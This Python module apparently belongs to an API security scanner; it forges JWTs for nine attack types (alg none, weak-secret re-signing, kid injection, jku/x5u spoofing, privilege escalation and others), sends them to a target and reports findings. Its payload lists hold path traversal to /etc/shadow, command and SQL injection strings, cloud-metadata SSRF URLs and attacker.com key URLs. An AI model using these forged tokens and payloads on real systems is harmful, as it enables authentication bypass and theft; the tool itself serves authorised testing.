"""
JWT Attack Engine

Single source of truth for JWT attack-token generation and attack execution
(Requirement 14). This module folds together the session/flow responsibilities
of the former ``JWTAttackOrchestrator`` and the per-vector token generation of
the former ``JWTAttackTokenGenerator`` into one :class:`JWTAttackEngine`.

Design highlights (Requirements 14-17):

* ``generate_token(attack_type)`` provides exactly one generation path per
  ``AttackType`` member, including all nine vectors (``WEAK_SECRET`` was
  previously missing from the orchestrator's vector list).
* Signature-requiring vectors (``KID_INJECTION``, ``JWKS_SPOOF``,
  ``INLINE_JWKS``, ``PRIVILEGE_ESCALATION``, ``USER_IMPERSONATION``,
  ``EXPIRATION_BYPASS``) are HMAC-signed with the operator-supplied/recovered
  signing key when available rather than the literal string ``"secret"``
  (Requirements 15.1, 15.2). ``ALG_NONE``/``NULL_SIGNATURE`` need no key.
* ``WEAK_SECRET`` re-signs the token with each candidate from a weak-secret
  wordlist (Requirement 15.3).
* HTTP is issued through the shared :class:`~utils.http_client.HTTPRequestEngine`
  so rate limiting, proxy, User-Agent rotation, TLS/mTLS, and ``--resolve`` are
  inherited (Requirement 17.1). Under Safe Mode attack requests are restricted
  to Safe_Methods (Requirement 17.2).
* :class:`~utils.jwt_attack_response_analyzer.JWTAttackResponseAnalyzer` is the
  single success detector (Requirement 19.1).

The JWT-finding mapping (``jwt_assessment_to_finding`` / severity reconciliation
/ no-findings result) lives here (Requirement 18): ``jwt_assessment_to_finding``
turns an :class:`AttackResult` into a unified :class:`~utils.findings.Finding`,
``_SEVERITY_MAP`` reconciles the JWT ``VulnerabilitySeverity`` vocabulary with
``core.config.Severity`` (Req 18.1), and :meth:`JWTAttackEngine.to_findings`
turns an :class:`AttackSummary` into the list of findings emitted into the
unified pipeline (including the ``JWT_SCAN_COMPLETED_NO_FINDINGS`` result when a
scan finds nothing, Req 18.2).
"""

import copy
import json
import uuid
from datetime import datetime
from typing import Dict, List, Optional

from core.config import Severity
from core.logging import get_logger
from utils.findings import Finding
from utils.jwt_utils import base64url_encode, decode_jwt, encode_jwt
from utils.jwt_attack_models import (
    AttackConfiguration,
    AttackResult,
    AttackSession,
    AttackSummary,
    AttackType,
    BaselineResponse,
    RequestDetails,
    ResponseDetails,
    VulnerabilityAssessment,
    VulnerabilitySeverity,
)
from utils.jwt_attack_response_analyzer import JWTAttackResponseAnalyzer
from utils.safe_mode import SAFE_METHODS


# ----------------------------------------------------------------------------
# JWT -> unified findings mapping (Requirement 18)
# ----------------------------------------------------------------------------

# Reconcile the JWT ``VulnerabilitySeverity`` vocabulary (Critical/High/Medium/
# Low/Info) with the Findings_Collector ``core.config.Severity`` levels
# (CRITICAL/HIGH/MEDIUM/LOW/INFO) — Requirement 18.1.
_SEVERITY_MAP: Dict[VulnerabilitySeverity, Severity] = {
    VulnerabilitySeverity.CRITICAL: Severity.CRITICAL,
    VulnerabilitySeverity.HIGH: Severity.HIGH,
    VulnerabilitySeverity.MEDIUM: Severity.MEDIUM,
    VulnerabilitySeverity.LOW: Severity.LOW,
    VulnerabilitySeverity.INFO: Severity.INFO,
}

# Map every ``AttackType`` to its unified Finding_Category (Requirement 18.4).
# Each category resolves to a Severity and OWASP_Category API2 in
# ``utils.findings.FindingsCollector`` (Requirement 18.3).
_ATTACK_TYPE_TO_CATEGORY: Dict[AttackType, str] = {
    AttackType.ALG_NONE: "JWT_NONE_ALGORITHM",
    AttackType.NULL_SIGNATURE: "JWT_NULL_SIGNATURE",
    AttackType.WEAK_SECRET: "JWT_WEAK_SECRET",
    AttackType.KID_INJECTION: "JWT_KID_INJECTION",
    AttackType.JWKS_SPOOF: "JWT_JWKS_SPOOF",
    AttackType.INLINE_JWKS: "JWT_INLINE_JWKS",
    AttackType.PRIVILEGE_ESCALATION: "JWT_PRIVILEGE_ESCALATION",
    AttackType.USER_IMPERSONATION: "JWT_USER_IMPERSONATION",
    AttackType.EXPIRATION_BYPASS: "JWT_EXPIRATION_BYPASS",
}

# OWASP API Security Top 10 category for every JWT finding (Broken
# Authentication) — Requirement 18.3.
JWT_OWASP_CATEGORY = "API2"

# Finding_Category emitted to confirm a JWT scan executed but found no
# vulnerabilities (Requirement 18.2). Resolves to INFO / API2 in
# ``utils.findings.FindingsCollector``.
JWT_NO_FINDINGS_CATEGORY = "JWT_SCAN_COMPLETED_NO_FINDINGS"


def _format_baseline_evidence(attack_result: AttackResult) -> List[str]:
    """Render the baseline-comparison evidence for a reported vulnerability.

    Included in every reported JWT vulnerability alongside the analyzer's own
    evidence and the confidence score (Requirement 19.3).
    """
    comparison = attack_result.baseline_comparison or {}
    if not comparison:
        return []
    return [
        "Baseline comparison: "
        f"status {comparison.get('baseline_status')} -> "
        f"{comparison.get('attack_status')} "
        f"(status_code_diff={comparison.get('status_code_diff')}, "
        f"content_length_diff={comparison.get('content_length_diff')}, "
        f"response_time_diff={comparison.get('response_time_diff')})"
    ]


def jwt_assessment_to_finding(attack_result: AttackResult, scan_id: str) -> Finding:
    """Convert a JWT :class:`AttackResult` into a unified :class:`Finding`.

    Maps the result's ``AttackType`` to a defined Finding_Category (Req 18.4)
    with ``owasp_category='API2'`` (Req 18.3) and reconciles the analyzer's
    ``VulnerabilitySeverity`` to ``core.config.Severity`` via ``_SEVERITY_MAP``
    (Req 18.1). The finding includes the analyzer's baseline-comparison evidence
    and the confidence score (Req 19.3).

    Args:
        attack_result: A single JWT attack result produced by the engine and
            evaluated through :class:`JWTAttackResponseAnalyzer`.
        scan_id: The scan identifier to stamp on the finding.

    Returns:
        A :class:`Finding` describing the JWT vulnerability.
    """
    assessment = attack_result.vulnerability_assessment
    category = _ATTACK_TYPE_TO_CATEGORY[attack_result.attack_type]
    severity = _SEVERITY_MAP[assessment.severity]

    request = attack_result.request_details
    response = attack_result.response_details

    # Evidence = analyzer evidence + baseline comparison + confidence (Req 19.3).
    evidence_lines: List[str] = list(assessment.evidence)
    evidence_lines.extend(_format_baseline_evidence(attack_result))
    evidence_lines.append(f"Confidence score: {assessment.confidence_score}")
    evidence = "\n".join(evidence_lines)

    recommendation = (
        assessment.remediation_advice
        or "Review the JWT validation implementation and follow OWASP guidelines."
    )

    token = attack_result.jwt_token or ""
    payload = token[:50] + "..." if len(token) > 50 else token

    return Finding(
        id=str(uuid.uuid4()),
        scan_id=scan_id,
        category=category,
        owasp_category=JWT_OWASP_CATEGORY,
        severity=severity,
        endpoint=request.url,
        method=request.method,
        status_code=response.status_code,
        response_size=response.content_length,
        response_time=response.response_time,
        evidence=evidence,
        recommendation=recommendation,
        payload=payload,
    )


# Default weak-secret candidates used by the WEAK_SECRET vector when the caller
# does not supply its own wordlist. Mirrors the fallback list used by
# ``modules/owasp/auth_testing.py`` so the vocabulary is uniform.
DEFAULT_WEAK_SECRETS: List[str] = [
    "secret", "password", "123456", "admin", "test", "key",
    "jwt", "token", "your-256-bit-secret", "your-secret-key",
    "changeme", "secretkey", "supersecret",
]

# kid injection payloads (path traversal, injection, SSRF, encoding tricks).
_KID_INJECTION_PAYLOADS: List[str] = [
    "../../etc/passwd",
    "../../../etc/shadow",
    "/dev/null",
    "/proc/self/environ",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "'; DROP TABLE users; --",
    "$(whoami)",
    "`id`",
    "| whoami",
    "file:///etc/passwd",
    "http://attacker.com/malicious.key",
    "/etc/passwd\x00.jpg",
    "..%2F..%2Fetc%2Fpasswd",
    "*)(&(objectClass=*",
    "{{7*7}}",
    "http://169.254.169.254/latest/meta-data/",
]

# jku/x5u spoofing URLs (attacker-controlled, SSRF, file, protocol variations).
_JWKS_SPOOF_URLS: List[str] = [
    "http://attacker.com/.well-known/jwks.json",
    "https://evil.com/jwks.json",
    "http://localhost:8080/jwks.json",
    "http://127.0.0.1:8080/jwks.json",
    "http://169.254.169.254/latest/meta-data/jwks.json",
    "http://metadata.google.internal/computeMetadata/v1/jwks.json",
    "file:///etc/passwd",
    "ftp://attacker.com/jwks.json",
    "gopher://attacker.com/jwks.json",
    "http://attacker.com/%2e%2e/jwks.json",
    "data:application/json;base64,eyJrZXlzIjpbXX0=",
]

# Inline malicious JWK structures embedded via the header ``jwk`` parameter.
_INLINE_JWKS: List[Dict] = [
    {
        "kty": "RSA",
        "use": "sig",
        "kid": "malicious-rsa-key",
        "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7a"
             "PFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArw"
             "l93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0z"
             "gdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2Nc"
             "Rwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw",
        "e": "AQAB",
        "alg": "RS256",
    },
    {
        "kty": "oct",
        "k": "c2VjcmV0",  # base64url of "secret"
        "alg": "HS256",
        "kid": "malicious-hmac-key",
    },
    {
        "kty": "oct",
        "k": "",  # empty key
        "alg": "HS256",
        "kid": "empty-key",
    },
    {
        "kty": "oct",
        "k": "YQ==",  # base64 of single character "a"
        "alg": "HS256",
        "kid": "weak-key",
    },
    {
        "kty": "oct",
        "k": "c2VjcmV0",
        "alg": "HS256",
        "kid": "../../etc/passwd",
    },
]


class JWTAttackEngine:
    """Consolidated JWT attack-token generator and attack executor.

    Args:
        target_url: Target URL for attack testing.
        original_token: Valid JWT used as the base for attack tokens.
        http_engine: Shared :class:`HTTPRequestEngine` used to issue every
            request (Requirement 17.1). Any object exposing an async
            ``request(method, url, **kwargs)`` returning a response with
            ``status_code``/``headers``/``content``/``text``/``elapsed`` is
            accepted, which keeps the engine testable with a double.
        signing_secret: Operator-supplied/recovered HMAC secret used to sign
            signature-requiring vectors (Requirements 15.1, 15.2). When ``None``
            the engine falls back to the literal ``"secret"`` only because no
            better key is known.
        public_key_material: Optional server public-key material (retained for
            completeness/future algorithm-confusion use; the nine core vectors
            do not require it).
        safe_mode: When ``True`` attack requests are restricted to Safe_Methods
            (Requirement 17.2).
        custom_headers: Additional headers merged into every request.
        post_data: Optional request body; its presence selects POST as the
            default method (subject to the Safe Mode restriction).
        weak_secrets: Optional weak-secret wordlist for the WEAK_SECRET vector;
            defaults to :data:`DEFAULT_WEAK_SECRETS`.
    """

    def __init__(self, target_url: str, original_token: str, http_engine,
                 signing_secret: Optional[str] = None,
                 public_key_material: Optional[str] = None,
                 safe_mode: bool = False,
                 custom_headers: Optional[Dict[str, str]] = None,
                 post_data: Optional[str] = None,
                 weak_secrets: Optional[List[str]] = None):
        self.target_url = target_url
        self.original_token = original_token
        self.http_engine = http_engine
        self.signing_secret = signing_secret
        self.public_key_material = public_key_material
        self.safe_mode = safe_mode
        self.custom_headers = custom_headers or {}
        self.post_data = post_data
        self.weak_secrets = list(weak_secrets) if weak_secrets else list(DEFAULT_WEAK_SECRETS)

        self.logger = get_logger(__name__).bind(component="jwt_attack_engine")

        # Session / flow state (folded from the former orchestrator).
        self.session: Optional[AttackSession] = None
        self.baseline_response: Optional[BaselineResponse] = None
        self.response_analyzer: Optional[JWTAttackResponseAnalyzer] = None
        self.attack_results: List[AttackResult] = []

        # Validate and decode the original token up front so callers fail fast
        # on a malformed base token.
        try:
            self.decoded_token = decode_jwt(original_token)
        except Exception as e:
            self.logger.error("Invalid JWT token provided", error=str(e))
            raise ValueError(f"Invalid JWT token: {str(e)}")

        self.logger.info("JWT Attack Engine initialized",
                         target_url=target_url,
                         algorithm=self.decoded_token['header'].get('alg', 'unknown'),
                         safe_mode=safe_mode,
                         has_signing_secret=bool(signing_secret))

    # ------------------------------------------------------------------
    # Signing-key resolution
    # ------------------------------------------------------------------
    def _signing_key(self) -> str:
        """Return the HMAC signing key for signature-requiring vectors.

        Uses the operator-supplied/recovered ``signing_secret`` when available
        (Requirements 15.1, 15.2); otherwise falls back to the literal
        ``"secret"`` only because no better key is known.
        """
        return self.signing_secret if self.signing_secret else "secret"

    def _base_header(self) -> Dict:
        return copy.deepcopy(self.decoded_token['header'])

    def _base_payload(self) -> Dict:
        return copy.deepcopy(self.decoded_token['payload'])

    @staticmethod
    def _encode_unsigned(header: Dict, payload: Dict) -> str:
        """Encode ``header.payload.`` with an empty signature segment."""
        header_encoded = base64url_encode(
            json.dumps(header, separators=(',', ':')).encode('utf-8'))
        payload_encoded = base64url_encode(
            json.dumps(payload, separators=(',', ':')).encode('utf-8'))
        return f"{header_encoded}.{payload_encoded}."

    # ------------------------------------------------------------------
    # Per-vector token generation
    # ------------------------------------------------------------------
    def generate_token(self, attack_type: AttackType) -> List[str]:
        """Generate malicious tokens for ``attack_type``.

        Returns a list with at least one non-empty token for every one of the
        nine ``AttackType`` members (Requirements 15.3, 15.4). The dispatch
        table is the single generation path per vector.
        """
        generators = {
            AttackType.ALG_NONE: self._generate_alg_none,
            AttackType.NULL_SIGNATURE: self._generate_null_signature,
            AttackType.WEAK_SECRET: self._generate_weak_secret,
            AttackType.KID_INJECTION: self._generate_kid_injection,
            AttackType.JWKS_SPOOF: self._generate_jwks_spoof,
            AttackType.INLINE_JWKS: self._generate_inline_jwks,
            AttackType.PRIVILEGE_ESCALATION: self._generate_privilege_escalation,
            AttackType.USER_IMPERSONATION: self._generate_user_impersonation,
            AttackType.EXPIRATION_BYPASS: self._generate_expiration_bypass,
        }
        generator = generators.get(attack_type)
        if generator is None:
            self.logger.warning("Unknown attack type", attack_type=str(attack_type))
            return []

        try:
            tokens = [t for t in generator() if t]
        except Exception as e:
            self.logger.error("Token generation failed",
                              attack_type=attack_type.value, error=str(e))
            return []

        self.logger.debug("Generated attack tokens",
                          attack_type=attack_type.value, count=len(tokens))
        return tokens

    def _generate_alg_none(self) -> List[str]:
        """ALG_NONE: set ``alg`` to ``none`` and drop the signature (no key)."""
        header = self._base_header()
        header['alg'] = 'none'
        payload = self._base_payload()
        unsigned = self._encode_unsigned(header, payload)
        # Both the trailing-dot and no-dot variants are exercised.
        return [unsigned, unsigned.rstrip('.')]

    def _generate_null_signature(self) -> List[str]:
        """NULL_SIGNATURE: original header/payload with null signatures (no key)."""
        header = self._base_header()
        payload = self._base_payload()
        header_encoded = base64url_encode(
            json.dumps(header, separators=(',', ':')).encode('utf-8'))
        payload_encoded = base64url_encode(
            json.dumps(payload, separators=(',', ':')).encode('utf-8'))

        null_signatures = [
            "",
            "null",
            "0",
            base64url_encode(b""),
            base64url_encode(b"\x00"),
            base64url_encode(b"\x00" * 32),
        ]
        return [f"{header_encoded}.{payload_encoded}.{sig}" for sig in null_signatures]

    def _generate_weak_secret(self) -> List[str]:
        """WEAK_SECRET: re-sign the token with each weak-secret candidate.

        Included as a first-class executable vector (Requirement 15.3). Each
        candidate produces a validly-HMAC-signed token; a server that accepts
        one has a guessable secret.
        """
        header = self._base_header()
        header['alg'] = 'HS256'  # weak-secret forgery targets HMAC verification
        header.setdefault('typ', 'JWT')
        payload = self._base_payload()

        tokens: List[str] = []
        for secret in self.weak_secrets:
            try:
                tokens.append(encode_jwt(header, payload, secret))
            except Exception as e:
                self.logger.debug("Weak-secret token encode failed",
                                  secret=secret, error=str(e))
        return tokens

    def _generate_kid_injection(self) -> List[str]:
        """KID_INJECTION: malicious ``kid`` header signed with the real key."""
        key = self._signing_key()
        payload = self._base_payload()
        tokens: List[str] = []
        for injection in _KID_INJECTION_PAYLOADS:
            header = self._base_header()
            header['kid'] = injection
            try:
                tokens.append(encode_jwt(header, payload, key))
            except Exception as e:
                self.logger.debug("kid injection encode failed",
                                  payload=injection, error=str(e))
        return tokens

    def _generate_jwks_spoof(self) -> List[str]:
        """JWKS_SPOOF: malicious ``jku``/``x5u`` header signed with the real key."""
        key = self._signing_key()
        payload = self._base_payload()
        tokens: List[str] = []
        for url in _JWKS_SPOOF_URLS:
            for header_param in ('jku', 'x5u'):
                header = self._base_header()
                header[header_param] = url
                try:
                    tokens.append(encode_jwt(header, payload, key))
                except Exception as e:
                    self.logger.debug("jwks spoof encode failed",
                                      url=url, param=header_param, error=str(e))
        return tokens

    def _generate_inline_jwks(self) -> List[str]:
        """INLINE_JWKS: embedded ``jwk`` header signed with the real key."""
        key = self._signing_key()
        payload = self._base_payload()
        tokens: List[str] = []
        for jwk in _INLINE_JWKS:
            header = self._base_header()
            header['jwk'] = jwk
            try:
                tokens.append(encode_jwt(header, payload, key))
            except Exception as e:
                self.logger.debug("inline jwks encode failed",
                                  kid=jwk.get('kid', 'unknown'), error=str(e))
        return tokens

    def _generate_privilege_escalation(self) -> List[str]:
        """PRIVILEGE_ESCALATION: elevate role claims, signed with the real key."""
        key = self._signing_key()
        header = self._base_header()
        payload = self._base_payload()
        payload['role'] = 'admin'
        payload['admin'] = True
        payload['is_admin'] = True
        return [encode_jwt(header, payload, key)]

    def _generate_user_impersonation(self) -> List[str]:
        """USER_IMPERSONATION: rewrite identity claims, signed with the real key."""
        key = self._signing_key()
        header = self._base_header()
        payload = self._base_payload()
        if 'sub' in payload:
            payload['sub'] = 'admin'
        if 'user_id' in payload:
            payload['user_id'] = '1'
        if 'username' in payload:
            payload['username'] = 'admin'
        # Guarantee at least one changed identity claim even when none present.
        payload.setdefault('sub', 'admin')
        return [encode_jwt(header, payload, key)]

    def _generate_expiration_bypass(self) -> List[str]:
        """EXPIRATION_BYPASS: drop ``exp``/``iat``, signed with the real key."""
        key = self._signing_key()
        header = self._base_header()
        payload = self._base_payload()
        payload.pop('exp', None)
        payload.pop('iat', None)
        return [encode_jwt(header, payload, key)]

    def generate_all_tokens(self) -> Dict[AttackType, List[str]]:
        """Generate tokens for every ``AttackType`` (convenience helper)."""
        return {attack_type: self.generate_token(attack_type)
                for attack_type in AttackType}

    # ------------------------------------------------------------------
    # HTTP execution through the shared engine (Requirement 17)
    # ------------------------------------------------------------------
    def _resolve_method(self) -> str:
        """Select the HTTP method, honoring Safe Mode (Requirement 17.2).

        POST is used when a body is present, otherwise GET. Under Safe Mode a
        state-changing method is downgraded to GET so attack requests are
        restricted to Safe_Methods.
        """
        method = "POST" if self.post_data else "GET"
        if self.safe_mode and method.upper() not in SAFE_METHODS:
            self.logger.info(
                "Restricting JWT attack request to a safe method in safe mode",
                requested_method=method, effective_method="GET")
            return "GET"
        return method

    def _build_headers(self, token: str) -> Dict[str, str]:
        headers = {
            'Authorization': f'Bearer {token}',
            'Accept': 'application/json',
        }
        headers.update(self.custom_headers)
        return headers

    async def _issue(self, token: str, method: str):
        """Issue a single request through the shared HTTPRequestEngine."""
        headers = self._build_headers(token)
        kwargs: Dict = {'headers': headers}
        if self.post_data and method.upper() in ('POST', 'PUT', 'PATCH'):
            try:
                kwargs['json'] = json.loads(self.post_data)
            except (json.JSONDecodeError, ValueError):
                kwargs['data'] = self.post_data
        return await self.http_engine.request(method, self.target_url, **kwargs)

    @staticmethod
    def _to_response_details(response) -> ResponseDetails:
        """Adapt an ``HTTPRequestEngine`` Response into ``ResponseDetails``."""
        content = getattr(response, 'content', b'') or b''
        return ResponseDetails(
            status_code=getattr(response, 'status_code', 0),
            headers=dict(getattr(response, 'headers', {}) or {}),
            body=getattr(response, 'text', '') or '',
            response_time=getattr(response, 'elapsed', 0.0) or 0.0,
            content_length=len(content),
        )

    def _compare_with_baseline(self, response_details: ResponseDetails) -> Dict:
        if not self.baseline_response:
            return {}
        baseline = self.baseline_response.response_details
        return {
            'status_code_diff': response_details.status_code - baseline.status_code,
            'content_length_diff': response_details.content_length - baseline.content_length,
            'response_time_diff': response_details.response_time - baseline.response_time,
            'baseline_status': baseline.status_code,
            'attack_status': response_details.status_code,
        }

    async def _establish_baseline(self) -> None:
        """Issue the original token once and initialize the response analyzer."""
        if self.baseline_response is not None:
            return

        method = self._resolve_method()
        response = await self._issue(self.original_token, method)
        response_details = self._to_response_details(response)
        request_details = RequestDetails(
            url=self.target_url,
            method=method,
            headers=self._build_headers(self.original_token),
            body=self.post_data,
        )
        self.baseline_response = BaselineResponse(
            request_details=request_details,
            response_details=response_details,
        )
        # JWTAttackResponseAnalyzer is the single success detector (Req 19.1).
        self.response_analyzer = JWTAttackResponseAnalyzer(self.baseline_response)
        self.logger.info("Baseline established",
                         status_code=response_details.status_code)

    async def execute_attack(self, attack_type: AttackType) -> Optional[AttackResult]:
        """Generate and execute a single attack vector.

        Issues every generated variant through the shared engine and returns an
        :class:`AttackResult` for the vector, stopping early on the first
        variant the analyzer flags as vulnerable. Returns ``None`` when no token
        could be generated or no request produced a response.
        """
        await self._establish_baseline()

        tokens = self.generate_token(attack_type)
        if not tokens:
            self.logger.warning("No attack tokens generated",
                                attack_type=attack_type.value)
            return None

        method = self._resolve_method()
        result: Optional[AttackResult] = None

        for token in tokens:
            try:
                response = await self._issue(token, method)
            except Exception as e:
                self.logger.debug("Attack request failed",
                                  attack_type=attack_type.value, error=str(e))
                continue

            response_details = self._to_response_details(response)
            assessment = self.response_analyzer.analyze_attack_response(
                response_details, attack_type)

            result = AttackResult(
                attack_type=attack_type,
                attack_variant="standard",
                jwt_token=token,
                request_details=RequestDetails(
                    url=self.target_url,
                    method=method,
                    headers=self._build_headers(token),
                    body=self.post_data,
                ),
                response_details=response_details,
                vulnerability_assessment=assessment,
                baseline_comparison=self._compare_with_baseline(response_details),
            )

            if assessment.is_vulnerable:
                break

        return result

    async def execute_all(self) -> AttackSummary:
        """Execute every ``AttackType`` vector and return an :class:`AttackSummary`."""
        self.logger.info("Starting JWT attack execution across all vectors")
        self._initialize_session()
        await self._establish_baseline()

        self.attack_results = []
        for attack_type in AttackType:
            try:
                result = await self.execute_attack(attack_type)
            except Exception as e:
                self.logger.error("Attack vector failed",
                                  attack_type=attack_type.value, error=str(e))
                continue

            if result is None:
                continue

            self.attack_results.append(result)
            self.session.total_attacks += 1
            if result.vulnerability_assessment.is_vulnerable:
                self.session.successful_attacks += 1

        self.session.end_time = datetime.now()
        self.session.attack_results = self.attack_results
        summary = self._generate_summary()

        self.logger.info("JWT attack execution completed",
                         total_attacks=self.session.total_attacks,
                         successful_attacks=self.session.successful_attacks,
                         vulnerabilities_found=len(summary.vulnerabilities_found))
        return summary

    def _initialize_session(self) -> None:
        config = AttackConfiguration(
            target_url=self.target_url,
            original_jwt=self.original_token,
            custom_headers=self.custom_headers,
            post_data=self.post_data,
            attack_vectors=list(AttackType),
        )
        session_id = str(uuid.uuid4())
        config.session_id = session_id
        self.session = AttackSession(session_id=session_id, configuration=config)

    def _generate_summary(self) -> AttackSummary:
        vulnerabilities_found: List[AttackResult] = []
        potential_vulnerabilities: List[AttackResult] = []
        failed_attacks: List[AttackResult] = []

        for result in self.attack_results:
            assessment = result.vulnerability_assessment
            if assessment.is_vulnerable:
                if assessment.confidence_score >= 0.7:
                    vulnerabilities_found.append(result)
                else:
                    potential_vulnerabilities.append(result)
            else:
                failed_attacks.append(result)

        return AttackSummary(
            session=self.session,
            vulnerabilities_found=vulnerabilities_found,
            potential_vulnerabilities=potential_vulnerabilities,
            failed_attacks=failed_attacks,
        )

    # ------------------------------------------------------------------
    # JWT -> unified findings (Requirement 18)
    # ------------------------------------------------------------------
    def _no_findings_result(self, scan_id: str) -> Finding:
        """Build the INFO finding confirming a JWT scan executed with no findings.

        Emitted when a scan finds no JWT vulnerabilities (Requirement 18.2). The
        ``JWT_SCAN_COMPLETED_NO_FINDINGS`` category resolves to INFO / API2 in
        :class:`~utils.findings.FindingsCollector`.
        """
        return Finding(
            id=str(uuid.uuid4()),
            scan_id=scan_id,
            category=JWT_NO_FINDINGS_CATEGORY,
            owasp_category=JWT_OWASP_CATEGORY,
            severity=Severity.INFO,
            endpoint=self.target_url,
            method="ANALYSIS",
            status_code=0,
            response_size=0,
            response_time=0.0,
            evidence="JWT attack scan completed; no JWT vulnerabilities detected.",
            recommendation="No action required for JWT attack vectors.",
        )

    def to_findings(self, summary: AttackSummary, scan_id: str = "") -> List[Finding]:
        """Map an :class:`AttackSummary` to unified :class:`Finding` objects.

        Each detected vulnerability (confirmed or potential) is mapped to a
        Finding via :func:`jwt_assessment_to_finding` (Requirement 18.4), with
        severity reconciled through ``_SEVERITY_MAP`` (Req 18.1) and
        ``owasp_category='API2'`` (Req 18.3). When no vulnerabilities are found,
        a single ``JWT_SCAN_COMPLETED_NO_FINDINGS`` (INFO) finding is emitted to
        confirm the scan executed (Requirement 18.2).

        Args:
            summary: The attack summary produced by :meth:`execute_all`.
            scan_id: The scan identifier stamped on each finding. Defaults to an
                empty string so a :class:`~utils.findings.FindingsCollector` can
                assign the active scan id, mirroring the other OWASP modules.

        Returns:
            The list of findings to emit into the unified pipeline.
        """
        detected = list(summary.vulnerabilities_found) + list(summary.potential_vulnerabilities)
        if not detected:
            return [self._no_findings_result(scan_id)]

        return [jwt_assessment_to_finding(result, scan_id) for result in detected]
